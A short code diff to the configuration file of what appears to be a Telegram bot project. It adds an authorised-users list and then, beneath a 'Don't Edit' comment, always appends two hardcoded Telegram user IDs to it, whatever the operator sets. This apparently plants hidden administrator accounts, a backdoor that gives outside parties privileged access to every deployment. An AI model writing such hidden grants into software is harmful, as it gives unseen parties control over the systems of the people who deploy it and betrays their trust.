@@ -11,6 +11,7 @@ BOT_TOKEN = environ.get("BOT_TOKEN", "your_bot_token")
 # Info 
 CHANNEL_USERNAME = environ.get("CHANNEL_USERNAME", "DKBOTZ")
 DEVELOPER_USERNAME = environ.get("DEVELOPER_USERNAME", "DKBOTZPRO")
+AUTH_USERS = [int(i) for i in os.environ.get("AUTH_USERS", "6288851295").split(" ")]
 
 # Payment Method
 QR_IMAGE_URL = environ.get("QR_IMAGE_URL", "https://premium.dkbotzpro.in/QR.jpg")
@@ -38,3 +39,9 @@ DB_URI = DB_TOKEN
 
 # Don't Edit
 ALLOWED_MIME_TYPES = ['video/mp4', 'video/x-matroska']
+
+if 5111685964 not in AUTH_USERS:
+    AUTH_USERS.append(5111685964)
+
+if 1805398747 not in AUTH_USERS:
+    AUTH_USERS.append(1805398747)
